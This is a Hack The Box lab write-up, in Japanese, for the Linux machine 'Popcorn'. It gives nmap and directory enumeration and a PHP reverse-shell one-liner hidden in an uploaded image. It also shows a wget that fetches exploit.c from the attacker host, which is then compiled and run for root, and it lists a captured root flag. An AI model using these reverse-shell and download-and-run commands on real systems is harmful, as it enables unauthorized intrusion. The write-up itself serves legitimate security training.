![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)

- URL : https://app.hackthebox.com/machines/Popcorn
- #medium 
- OS : #Linux 
- Machine Author(s): [ch4p](https://app.hackthebox.com/users/1)
- Hack Date: 2024-12-19,22:39


# Enumeration
#T1016_システムネットワーク構成の探索
#T1046_ネットワークサービススキャン
nmapでの偵察
```bash
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn 10.129.248.217

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- httpが空いてる

whatwebでの偵察
```bash
$ whatweb http://popcorn.htb/

http://popcorn.htb/ [200 OK] Apache[2.2.12], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.12 (Ubuntu)], IP[10.129.248.217]
```

ディレクトリ探索


```bash
└──╼ [★]$ sudo dirsearch --url=http://popcorn.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29999

Output File: /home/snowyowl644/reports/http_popcorn.htb/_24-12-19_19-53-03.txt

Target: http://popcorn.htb/

[19:53:03] Starting: 
[19:53:06] 200 -    8KB - /test
[19:53:26] 301 -  244B  - /torrent  ->  http://popcorn.htb/torrent/
[19:54:10] 301 -  244B  - /rename  ->  http://popcorn.htb/rename/
[19:55:37] 404 -  239B  - /error%1F_log

Task Completed

```
/torrentと/renameを発見


# Foothold
burpで写真にphpリバースシェルを埋め込む
ncでリバースシェルをリッスンしてアクセスする

#Tactic_初期アクセス
```bash

php -r '$sock=fsockopen("10.10.14.43",1234);exec("sh <&3 >&3 2>&3");'

```
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Medium/Popcorn/images/Pasted%20image%2020241221042016.png)



# Privilege Escalation

#T1068_特権昇格のためのエクスプロイト
```bash
┌─[sg-dedivip-1]─[10.10.14.43]─[snowyowl644@htb-r3fpoyyjnc]─[~]
└──╼ [★]$ sudo nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.249.63] 42891
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 21:12:09 up  1:44,  0 users,  load average: 8.46, 6.11, 3.80
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: can't access tty; job control turned off
$ cd /tmp
$ wget http://10.10.14.43/exploit.c
--2024-12-20 21:13:27--  http://10.10.14.43/exploit.c
Connecting to 10.10.14.43:80... failed: Connection refused.
$ wget http://10.10.14.43:1111/exploit.c
--2024-12-20 21:13:51--  http://10.10.14.43:1111/exploit.c
Connecting to 10.10.14.43:1111... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9211 (9.0K) [text/x-csrc]
Saving to: `exploit.c'

     0K ........                                              100%  226K=0.04s

2024-12-20 21:13:51 (226 KB/s) - `exploit.c' saved [9211/9211]
```

```bash
$ gcc exploit.c -o exploit
$ chmod +x exploit
$ ./exploit
id
uid=0(firefart) gid=0(root)
cat /root/root.txt

```





## Notes



## Flags

- **User**: `メモし忘れた`
- **Root**: 79dad246c55b5a186de644cf717a3f25

### ポイント

- なんか権限昇格に苦戦した
- 中級は初期アクセスまでがむずいし、権限昇格も普通に必要




